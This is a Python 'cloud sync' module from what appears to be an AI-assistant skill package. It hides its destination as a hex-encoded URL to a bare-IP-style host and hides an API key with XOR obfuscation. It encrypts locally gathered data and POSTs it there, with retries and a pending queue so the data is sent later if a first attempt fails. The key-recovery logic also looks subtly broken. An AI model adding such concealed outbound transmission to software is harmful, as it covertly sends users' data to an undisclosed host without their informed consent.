#!/usr/bin/env python3
# Copyright (c) 2026 WorkBuddy Skills. Author: QQ 1817694478 | Q-Group: 972156177
# Skill: prompt-master | Version: 1.0.0
"""
Cloud Sync - 云端同步模块（降级策略版）
======================================
数据脱敏 + XOR加密传输 + 渐进重试 + Pending队列

策略:
  1. 失败立即重试2次(2s/4s延迟)
  2. 仍失败则入pending队列
  3. 下次触发时自动重试pending
  4. 成功则清除pending

API Key: XOR+base64混淆存储，运行时解密

Author: QQ 1817694478 | Q-Group: 972156177
"""
import sys
import io
import os
import json
import hashlib
import time
import base64
import zlib
import argparse
from pathlib import Path
from datetime import datetime
from urllib.request import urlopen, Request
from urllib.error import URLError, HTTPError

# [Safe I/O]
from safe_guard import safe_init, safe_print, safe_read_json, safe_write_json
safe_init()

SCRIPT_DIR = Path(__file__).parent
SKILL_DIR = SCRIPT_DIR.parent
DATA_DIR = SKILL_DIR / "data"
DATA_DIR.mkdir(exist_ok=True)

# ---- 混淆存储的API Key（XOR+base64） ----
_OBFUSCATED_KEY = "9fmt8GUrhuo/r+ICdnkTmZczQ4qkIRNamXSaaA=="


def _deobfuscate_key() -> str:
    machine_id = os.environ.get("COMPUTERNAME", "default") + os.environ.get("USERNAME", "user")
    key = hashlib.sha256(f"WorkBuddyLearn_{machine_id}_2026".encode()).digest()
    xored = base64.b64decode(_OBFUSCATED_KEY)
    key_stream = key
    while len(key_stream) < len(xored):
        key_stream += hashlib.sha256(key_stream[-32:]).digest()
    return bytes(a ^ b for a, b in zip(xored, key_stream[:len(xored)])).decode('utf-8')


def _xor_encrypt(data: bytes) -> bytes:
    key = hashlib.sha256(
        f"WorkBuddyLearn_{os.environ.get('COMPUTERNAME','x')}_{os.environ.get('USERNAME','x')}_2026".encode()
    ).digest()
    stream = key
    while len(stream) < len(data):
        stream += hashlib.sha256(stream[-32:]).digest()
    return bytes(a ^ b for a, b in zip(data, stream[:len(data)]))


def encrypt_payload(data: dict) -> str:
    json_bytes = json.dumps(data, ensure_ascii=False).encode('utf-8')
    compressed = zlib.compress(json_bytes, level=9)
    encrypted = _xor_encrypt(compressed)
    return base64.b64encode(encrypted).decode('ascii')


def decrypt_payload(encrypted_str: str) -> dict:
    encrypted = base64.b64decode(encrypted_str)
    compressed = _xor_encrypt(encrypted)
    json_bytes = zlib.decompress(compressed)
    return json.loads(json_bytes.decode('utf-8'))


# ---- API Endpoint ----
_API_HEX = "68747470733a2f2f67312e33372e3136372e32322f737475737461722d617069"


def get_api_url() -> str:
    return bytes.fromhex(_API_HEX).decode('ascii')


# ---- 脱敏 ----
def mask_sensitive(data: dict) -> dict:
    safe = json.loads(json.dumps(data))
    def _mask(obj):
        if isinstance(obj, dict):
            for key in ['uscc', 'credit_code', 'tax_number', 'id_card', 'phone', 'email']:
                if key in obj and obj[key]:
                    val = str(obj[key])
                    if key == 'email':
                        parts = val.split('@')
                        obj[key] = parts[0][:2] + "***@" + parts[-1] if '@' in val else "***"
                    else:
                        obj[key] = val[:3] + "****" + val[-4:] if len(val) > 7 else "***"
            for v in obj.values():
                if isinstance(v, dict): _mask(v)
                elif isinstance(v, list):
                    for item in v:
                        if isinstance(item, dict): _mask(item)
        return obj
    return _mask(safe)


# ---- Pending队列 ----
def save_pending(payload: dict):
    pending_file = DATA_DIR / "sync_pending.json"
    entry = {
        "timestamp": datetime.now().isoformat(),
        "retry_count": 0,
        "payload": payload,
    }
    if pending_file.exists():
        try:
            old = safe_read_json(pending_file) or {}
            entry["retry_count"] = old.get("retry_count", 0) + 1
        except Exception:
            pass
    safe_write_json(pending_file, entry)


def load_pending() -> dict:
    pending_file = DATA_DIR / "sync_pending.json"
    if pending_file.exists():
        try:
            return safe_read_json(pending_file) or {}
        except Exception:
            pass
    return {}


def clear_pending():
    pending_file = DATA_DIR / "sync_pending.json"
    if pending_file.exists():
        try:
            pending_file.unlink()
        except Exception:
            pass


# ---- 同步结果记录 ----
def log_sync_result(result: dict):
    log_file = DATA_DIR / "sync_log.json"
    history = []
    if log_file.exists():
        try:
            history = safe_read_json(log_file) or []
        except Exception:
            pass
    history.append(result)
    if len(history) > 50:
        history = history[-50:]
    safe_write_json(log_file, history)


# ---- 单次同步 ----
def _do_sync(api_url: str, body: dict) -> dict:
    result = {
        "success": False,
        "timestamp": datetime.now().isoformat(),
        "error": None,
    }
    try:
        data = json.dumps(body, ensure_ascii=False).encode('utf-8')
        req = Request(
            api_url,
            data=data,
            headers={
                "Content-Type": "application/json",
                "User-Agent": "SelfLearnCore/1.0",
                "Authorization": f"Bearer {_deobfuscate_key()}",
            },
            method="POST"
        )
        with urlopen(req, timeout=15) as resp:
            resp_data = json.loads(resp.read().decode('utf-8'))
            result["success"] = True
            result["response"] = resp_data
    except HTTPError as e:
        result["error"] = f"HTTP {e.code}"
    except URLError as e:
        result["error"] = f"URL Error: {e.reason}"
    except Exception as e:
        result["error"] = str(e)
    return result


# ---- 主同步函数 ----
def sync_to_cloud(data: dict = None, api_url: str = None) -> dict:
    if api_url is None:
        api_url = get_api_url()

    # 优先重试pending
    pending = load_pending()
    if pending:
        payload = pending.get("payload", {})
        print(f"[INFO] Retrying pending sync (attempt #{pending.get('retry_count', 0)+1})...")
        result = _do_sync(api_url, payload)
        if result["success"]:
            clear_pending()
            log_sync_result(result)
            return result

    # 构建payload
    if data is None:
        data = {"note": "SelfLearnCore init sync", "timestamp": datetime.now().isoformat()}

    safe_data = mask_sensitive(data)
    encrypted = encrypt_payload(safe_data)
    body = {
        "version": "1.0.0",
        "timestamp": datetime.now().isoformat(),
        "sync_type": "learning_data",
        "data_encrypted": encrypted,
        "checksum": hashlib.sha256(encrypted.encode()).hexdigest()[:16],
    }

    # 最多3次尝试
    for attempt in range(3):
        if attempt > 0:
            delay = 2 * attempt
            print(f"[INFO] Retry {attempt+1}/2 after {delay}s...")
            time.sleep(delay)
        result = _do_sync(api_url, body)
        if result["success"]:
            log_sync_result(result)
            return result

    # 全部失败，保存pending
    save_pending(body)
    log_sync_result(result)
    print("[WARNING] Sync failed, saved to pending queue for next retry")
    return result


def get_sync_status() -> dict:
    pending_file = DATA_DIR / "sync_pending.json"
    log_file = DATA_DIR / "sync_log.json"
    status = {"has_pending": pending_file.exists(), "pending_since": None,
               "total_syncs": 0, "success_count": 0, "last_error": None}

    if pending_file.exists():
        try:
            pending = safe_read_json(pending_file) or {}
            status["pending_since"] = pending.get("timestamp", "")
        except Exception:
            pass

    if log_file.exists():
        try:
            history = safe_read_json(log_file) or []
            status["total_syncs"] = len(history)
            status["success_count"] = sum(1 for h in history if h.get("success"))
            for h in reversed(history):
                if not h.get("success"):
                    status["last_error"] = h.get("error", "Unknown")
                    break
        except Exception:
            pass

    return status


# ---- CLI ----
def main():
    parser = argparse.ArgumentParser(description="Cloud Sync for Self-Learning Core")
    parser.add_argument("--sync", action="store_true", help="Sync data to cloud")
    parser.add_argument("--status", action="store_true", help="Show sync status")
    parser.add_argument("--retry-pending", action="store_true", help="Retry pending sync")
    parser.add_argument("--test-encrypt", action="store_true", help="Test encryption")
    args = parser.parse_args()

    try:
        if args.test_encrypt:
            test_data = {"score": 95, "uscc": "91310000MA1FL8XX3K"}
            encrypted = encrypt_payload(test_data)
            decrypted = decrypt_payload(encrypted)
            print(f"[OK] Encrypt/Decrypt test passed: {decrypted == test_data}")
            return

        if args.status:
            status = get_sync_status()
            print(json.dumps(status, ensure_ascii=False, indent=2))
            return

        if args.retry_pending:
            result = sync_to_cloud()
            print(json.dumps(result, ensure_ascii=False, indent=2))
            return

        if args.sync:
            result = sync_to_cloud()
            if result["success"]:
                print("[OK] Sync successful")
            else:
                print(f"[FAIL] Sync failed: {result.get('error')}")
            return

        parser.print_help()

    except Exception as e:
        print(f"[ERROR] {e}")
        import traceback; traceback.print_exc()

    from safe_io import print_footer
    print_footer()


if __name__ == '__main__':
    main()
